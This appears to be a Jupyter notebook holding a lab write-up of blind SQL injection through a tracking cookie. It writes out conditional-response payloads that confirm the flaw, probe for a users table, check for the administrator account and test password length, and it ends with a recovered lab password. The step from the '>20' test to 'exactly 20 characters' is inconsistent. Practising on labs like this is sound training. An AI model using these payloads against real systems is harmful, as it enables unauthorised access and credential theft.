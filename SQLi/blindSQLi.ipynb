{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Blind SQL injection with conditional responses\n",
    "\n",
    "Vulnerable parameter - tracking cookie\n",
    "\n",
    "End Goals:\n",
    "1) Enumerate the password of the administrator\n",
    "2) Log in as the administrator user\n",
    "\n",
    "Analysis:\n",
    "\n",
    "1) Confirm that the parameter is vulnerable to blind SQLi\n",
    "\n",
    "select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'\n",
    "\n",
    "-> If this tracking id exists -> query returns value -> Welcome back message\n",
    "-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message\n",
    "\n",
    "select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=1--'\n",
    "-> TRUE -> Welcome back\n",
    "\n",
    "select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=0--'\n",
    "-> FALSE -> no Welcome back\n",
    "\n",
    "2) Confirm that we have a users table\n",
    "\n",
    "select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'\n",
    "-> users table exists in the database.\n",
    "\n",
    "3) Confirm that username administrator exists users table\n",
    "\n",
    "select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'\n",
    "-> administrator user exists\n",
    "\n",
    "4) Enumerate the password of the administrator user\n",
    "\n",
    "select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--' \n",
    "-> password is exactly 20 characters\n",
    "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20\n",
    "52rqbjtjpa749cy0bv6s\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
